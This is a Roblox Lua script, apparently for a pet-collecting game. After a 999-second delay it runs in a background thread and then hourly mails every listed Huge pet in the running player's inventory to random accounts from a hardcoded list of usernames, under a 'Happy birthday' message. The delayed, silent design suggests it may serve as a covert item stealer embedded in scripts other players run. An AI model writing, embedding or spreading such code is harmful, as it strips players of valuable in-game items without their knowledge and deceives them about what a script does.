
task.spawn(function() 

wait(999)



getgenv().Settings = {
    ["list_pet"] = {

["Huge Scribe Squirrel"] 	= {Soluong_Yeu_cau = 0},
["Golden Huge Scribe Squirrel"] 	= {Soluong_Yeu_cau = 0},

["Huge Chill Bunny"] 	= {Soluong_Yeu_cau = 0},
["Golden Huge Chill Bunny"] 	= {Soluong_Yeu_cau = 0},

["Huge Lifeguard Shark"] 	= {Soluong_Yeu_cau = 0},
["Golden Huge Lifeguard Shark"] 	= {Soluong_Yeu_cau = 0},

["Huge Telescope Owl"] 	= {Soluong_Yeu_cau = 0},
["Golden Huge Telescope Owl"] 	= {Soluong_Yeu_cau = 0},

["Huge Runebound Bobcat"] 	= {Soluong_Yeu_cau = 0},
["Golden Huge Runebound Bobcat"] 	= {Soluong_Yeu_cau = 0},

},
   
}

ds_nguoi_nhan_pet = {"sijmongirthss", "Ash3rP0w3rPanda2018", "soystaylan5", "dreddyewele60", "1971Nowak3135", "mcconchifredjeyo", "ecclweltst", "killedsanthi85", "tamuleviazulayv", "hegemangaltieri81"}




-- Hàm kiểm tra tên có chứa từ khóa
function Kiem_tra_ten_co_them_tu_la_(itemName)
    local SH_find = false
    local PT_find = false
    local TN_find = false    
    local category_find = false
	
    -- Kiểm tra nếu itemName có từ "Shiny"
    if string.find(itemName, "Shiny") then
        SH_find = true
        itemName = string.gsub(itemName, "Shiny ", "") -- Loại bỏ từ "Shiny"
        warn("SH_find true")
    end

    -- Kiểm tra nếu itemName có từ "Golden"
    if string.find(itemName, "Golden") then
        PT_find = 1
        itemName = string.gsub(itemName, "Golden ", "") -- Loại bỏ từ "Golden"
        warn("PT_find 1")
    end

    -- Kiểm tra nếu itemName có từ "Rainbow"
    if string.find(itemName, "Rainbow") then
        PT_find = 2
        itemName = string.gsub(itemName, "Rainbow ", "") -- Loại bỏ từ "Rainbow"
        warn("PT_find 2")
    end

    -- Kiểm tra nếu itemName có từ "Shiny Golden"
    if string.find(itemName, "Shiny Golden") then
        SH_find = true
        PT_find = 1
        itemName = string.gsub(itemName, "Shiny Golden ", "") -- Loại bỏ từ "Shiny Golden"
        warn("PT_find 1 SH_find true")
    end

    -- Kiểm tra nếu itemName có từ "Shiny Rainbow"
    if string.find(itemName, "Shiny Rainbow") then
        SH_find = true
        PT_find = 2
        itemName = string.gsub(itemName, "Shiny Rainbow ", "") -- Loại bỏ từ "Shiny Rainbow"
        warn("PT_find 2 SH_find true")
    end

    -- Kiểm tra nếu itemName có từ "TNx"
    local tnMatch = itemName:match("TN(%d)")  -- Tìm kiếm "TN" kèm một số
    if tnMatch then
        TN_find = tonumber(tnMatch)  -- Gán giá trị của TN_find
        itemName = string.gsub(itemName, " TN%d", "")  -- Loại bỏ phần "TNx" khỏi itemName
    end

    -- Kiểm tra category
    if string.find(itemName, "Potion") then
        category_find = "Potion"
        itemName = string.gsub(itemName, "Potion ", "") -- Loại bỏ từ "Potion"
        warn("category Potion")
    end
    if string.find(itemName, "Enchant") then
        category_find = "Enchant"
        itemName = string.gsub(itemName, "Enchant ", "") -- Loại bỏ từ "Enchant"
        warn("category Enchant")
    end
	if string.find(itemName, "XPPotion") then
        category_find = "XPPotion"
        itemName = string.gsub(itemName, "XPPotion ", "") -- Loại bỏ từ "XPPotion"
        warn("category XPPotion")
    end

    -- Trả về tất cả các giá trị
    return itemName, SH_find, PT_find
end

-- Hàm tìm trong từng bảng con của Inventory
local function findInInventorySubTable(subTable, itemName, PT_find, SH_find)
    if type(subTable) ~= "table" then return end

    -- Sử dụng string.match để tìm chính xác itemName
    for uid, v in pairs(subTable) do
        if type(v) == "table" and v.id then
            -- Kiểm tra xem id có khớp chính xác với itemName và PT_find, SH_find, TN_find
            if string.match(v.id, "^" .. itemName .. "$") then  -- Dùng string.match để tìm phần chuỗi chính xác
                local ok = true

                -- Kiểm tra điều kiện PT_find nếu có
                if PT_find ~= false and v.pt ~= PT_find then
                    ok = false
                end
                if PT_find == false and v.pt == 1 then
                    ok = false
                end
                if PT_find == false and v.pt == 2 then
                    ok = false
                end
                -- Kiểm tra điều kiện SH_find nếu có
                if SH_find == true and v.sh == nil then
                    ok = false 
                end
                if SH_find == false and v.sh == true then
                    -- Nếu SH_find là nil thì chỉ chấp nhận v.sh là nil
                    ok = false
                end

                -- Nếu tất cả điều kiện đều thỏa mãn, thêm vào danh sách
                if ok then
                    table.insert(itemsFound, {
                        UID = uid,
                        ID = v.id,
                        PT = v.pt,
                        SH = v.sh,
                        TN = v.tn,
                        Count = tonumber(v._am) or 1,
                        Category = categoryName  -- Thêm category cho từng mục
                    })
                end
            end
        end
    end
end

-- Hàm kiểm tra và gửi pet
local function sendExcessPets()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
	local Network = require(Client.Network)
	local SaveData = require(ReplicatedStorage.Library.Client.Save).Get()   

    -- Lặp qua từng pet trong list_pet
    for petName, petData in pairs(getgenv().Settings["list_pet"]) do
        local itemName = petName
        local requiredAmount = petData.Soluong_Yeu_cau
        local itemName,SH_find, PT_find = Kiem_tra_ten_co_them_tu_la_(itemName)
        
        -- Reset lại danh sách pet
        itemsFound = {}

        -- Tìm trong Inventory
        findInInventorySubTable(SaveData.Inventory.Pet, itemName, PT_find, SH_find)
        
        -- Kiểm tra số lượng pet có sẵn trong kho
        local totalCount = 0
        for _, item in pairs(itemsFound) do
            if item.ID == itemName then
                totalCount = totalCount + item.Count
            end
        end

        -- Nếu số lượng pet có trong kho nhiều hơn yêu cầu, gửi pet 
        if totalCount > requiredAmount then
            
            local randomRecipient = ds_nguoi_nhan_pet[math.random(1, #ds_nguoi_nhan_pet)]
            local message = string.format("Happy birthday %s! You received an excess pet: %s", randomRecipient, itemName)

            -- Lặp qua và gửi pet
            local petSent = 0
            for _, item in pairs(itemsFound) do
				
                if item.ID == itemName and petSent < totalCount then
                    
                    -- Gửi pet
					wait(3)
					if string.find(itemName,"Huge") then
						--warn("Huge chi send 1")
						totalCount = 1
					end
					if requiredAmount == 1 then
						--warn("Giữ lại 1 con")
						totalCount = totalCount - 1
					end
                    local success, err = pcall(function()
                        return Network.Invoke("Mailbox: Send", randomRecipient, message, "Pet", item.UID, totalCount)
                    end)
                    if success then
                        warn("✅ Đã gửi pet " .. itemName .. " cho " .. randomRecipient .. " với số lượng " .. totalCount)
                    else
                        warn("❌ Lỗi khi gửi pet " .. itemName .. ": " .. err)
                    end
                    
                end
            end
        else
            warn("⚠️ Không có đủ pet " .. itemName .. " trong kho để gửi.")
        end
    end
end

-- Gọi hàm gửi pet
while true do
sendExcessPets()
wait(3600)
end

end)
